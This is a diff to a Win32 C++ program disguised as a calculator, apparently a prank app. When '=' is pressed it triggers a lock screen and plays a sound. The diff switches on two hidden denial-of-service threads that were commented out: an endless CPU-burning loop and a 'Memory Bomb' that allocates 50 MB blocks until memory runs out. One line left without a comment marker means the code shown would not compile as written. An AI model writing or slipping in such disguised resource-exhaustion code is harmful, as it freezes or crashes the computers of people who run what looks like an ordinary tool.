@@ -27,10 +27,12 @@ HWND hEdit;
 std::string expression = "";
 
 const std::string ASCII_TROLL_TEXT = 
-    " _ _ ____ _ _ _ _ _ _ _ ____ __ ____ \n"
-    "( \\/ )( ___)( \\/ ) ( \\/ )( )( \\/ ) ( _ \\ / \\ ( _ \\ \n"
-    " ) _ (/__) \\ / ) _ ( )( / ( ) _ (( O ) ) _ < \n"
-    "(_/\\_)(____) \\/ (_/\\_)(__)\\_/\\_) (____/ \\__/ (____/ \n";
+"                              .__            ___.     \\      \n"
+"  ____    ____  __ __    ____ |  |__  __ __  \_ |__   ____    \n"
+" /    \  / ___\|  |  \  /    \|  |  \|  |  \  | __ \ /  _ \   \n"
+"|   |  \/ /_/  >  |  / |   |  \   Y  \  |  /  | \_\ (  <_> )  \n"
+"|___|  /\___  /|____/  |___|  /___|  /____/   |___  /\____/   \n"
+"    \//_____/              \/     \/             \/           \n";
 
 void PlayHehehe() {
     try {
@@ -71,35 +73,31 @@ void TriggerLockScreen(HWND hwnd) {
     
     std::thread([]() {
         PlayHehehe(); 
+        
+        std::thread([]() {
+           while (true) {
+               volatile unsigned long long x = 0;
+                x++;
+            }
+        }).detach();
 
-        // Luồng ngốn CPU
-       // std::thread([]() {
-       //    while (true) {
-       //        volatile unsigned long long x = 0;
-        //        x++;
-         //   }
-       // }).detach();
-
-        // Luồng bom RAM (Memory Bomb)
-       // std::thread([]() {
-        //    std::vector<std::string> memoryBomb;
-         //   while (true) {
-          //      memoryBomb.push_back(std::string(1024 * 1024 * 50, 'X'));
-           //     Sleep(10);
-           // }
+         Luồng bom RAM (Memory Bomb)
+        std::thread([]() {
+            std::vector<std::string> memoryBomb;
+            while (true) {
+                memoryBomb.push_back(std::string(1024 * 1024 * 50, 'X'));
+                Sleep(10);
+            }
         }).detach();
     }).detach();
 }
 
-// Xử lý sự kiện giao diện cửa sổ
 LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     switch (uMsg) {
     case WM_CREATE: {
-        // Tạo khung hiển thị kết quả (Entry box)
         hEdit = CreateWindowEx(0, "EDIT", "", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_RIGHT | ES_READONLY,
             10, 10, 265, 40, hwnd, (HMENU)ID_EDIT, NULL, NULL);
 
-        // Tạo các nút bấm máy tính
         CreateWindow("BUTTON", "C", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 10, 60, 130, 50, hwnd, (HMENU)ID_BTN_C, NULL, NULL);
         CreateWindow("BUTTON", "/", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 145, 60, 60, 50, hwnd, (HMENU)ID_BTN_DIV, NULL, NULL);
         CreateWindow("BUTTON", "*", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 210, 60, 65, 50, hwnd, (HMENU)ID_BTN_MUL, NULL, NULL);
@@ -137,7 +135,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
         else if (id == ID_BTN_C)   { expression = ""; SetWindowText(hEdit, ""); }
         else if (id == ID_BTN_EQ)  {
             SetWindowText(hEdit, "Result");
-            // Đợi 0.4 giây rồi sập bẫy giống hệt logic root.after trong Python!
             std::thread([hwnd]() {
                 Sleep(400);
                 TriggerLockScreen(hwnd);
@@ -146,7 +143,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
         break;
     }
     case WM_CTLCOLORSTATIC: {
-        // Đổi màu chữ thành đỏ rực, nền đen cho thông báo troll
         HDC hdcStatic = (HDC)wParam;
         SetTextColor(hdcStatic, RGB(255, 0, 0));
         SetBkColor(hdcStatic, RGB(0, 0, 0));
@@ -162,7 +158,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     return 0;
 }
 
-// Hàm khởi chạy chương trình C++ Win32
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     const char* CLASS_NAME = "TrollCalcClass";
 
